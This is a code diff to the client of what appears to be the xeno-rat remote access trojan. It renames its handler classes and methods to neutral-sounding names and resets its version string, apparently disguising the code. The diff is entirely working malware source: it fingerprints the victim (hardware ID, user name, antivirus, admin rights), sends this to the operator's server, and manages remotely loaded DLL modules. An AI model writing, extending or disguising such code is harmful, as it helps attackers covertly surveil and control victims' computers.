@@ -12,10 +12,10 @@ namespace xeno_rat_client
     class Handler
     {
         Node Main;
-        DllHandler dllhandler;
-        public Handler(Node _Main, DllHandler _dllhandler) 
+        ModuleManager ModuleManager;
+        public Handler(Node _Main, ModuleManager _ModuleManager) 
         {
-            dllhandler = _dllhandler;
+            ModuleManager = _ModuleManager;
             Main = _Main;
         }
         public async Task CreateSubSock(byte[] data)
@@ -24,14 +24,14 @@ namespace xeno_rat_client
             {
                 int type = data[1];
                 int retid = data[2];
-                Node sub = await Main.ConnectSubSockAsync(type, retid, OnDisconnect);
+                Node sub = await Main.InitializeConnectionAsync(type, retid, HandleServiceStop);
                 sub.Parent = Main;
                 Main.AddSubNode(sub);
-                if (sub.SockType == 1)
+                if (sub.connectionType == 1)
                 {
                     await Type1Receive(sub);
                 }
-                else if (sub.SockType == 2)
+                else if (sub.connectionType == 2)
                 {
                     await Type2Receive(sub);
                 }
@@ -46,29 +46,29 @@ namespace xeno_rat_client
                 Console.WriteLine("error with subnode, subnode type=" + data[1]);
             }
         }
-        private void OnDisconnect(Node SubNode) 
+        private void HandleServiceStop(Node SubNode) 
         { 
             
         }
 
         private async Task GetAndSendInfo(Node Type0) 
         {
-            if (Type0.SockType != 0) 
+            if (Type0.connectionType != 0) 
             {
                 return;
             }
             //get hwid, username etc. seperated by null
-            string clientversion = "1.8.7";//find a way to get the client version.
+            string clientversion = "1.0.0";//find a way to get the client version.
             string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
             byte[] data = new byte[0];
             byte[] nullbyte = new byte[] { 0 };
             for(int i=0;i<info.Length;i++) 
             {
                 byte[] byte_data = Encoding.UTF8.GetBytes(info[i]);
-                data = SocketHandler.Concat(data, byte_data);
+                data = NetworkManager.Concat(data, byte_data);
                 if (i != info.Length - 1) 
                 {
-                    data = SocketHandler.Concat(data, nullbyte);
+                    data = NetworkManager.Concat(data, nullbyte);
                 }
             }
             await Type0.SendAsync(data);
@@ -153,7 +153,7 @@ namespace xeno_rat_client
                         await SendUpdateInfo(subServer);
                         break;
                     case 1:
-                        await dllhandler.DllNodeHandler(subServer);
+                        await ModuleManager.DllNodeHandler(subServer);
                         goto outofwhileloop;
                     case 2:
                         await setSetId(subServer,data);
@@ -176,14 +176,14 @@ namespace xeno_rat_client
             switch (opcode) 
             {
                 case 0:
-                    await subServer.SendAsync(Encoding.UTF8.GetBytes(String.Join("\n", dllhandler.Assemblies.Keys)));
+                    await subServer.SendAsync(Encoding.UTF8.GetBytes(String.Join("\n", ModuleManager.Assemblies.Keys)));
                     break;//get dlls
                 case 1:
                     string assm=Encoding.UTF8.GetString(data.Skip(2).ToArray());
                     bool worked = false;
-                    if (dllhandler.Assemblies.Keys.Contains(assm)) 
+                    if (ModuleManager.Assemblies.Keys.Contains(assm)) 
                     {
-                        worked=dllhandler.Assemblies.Remove(assm);
+                        worked=ModuleManager.Assemblies.Remove(assm);
                     }
 
                     await subServer.SendAsync(new byte[] { (byte)(worked ? 1 : 0) });
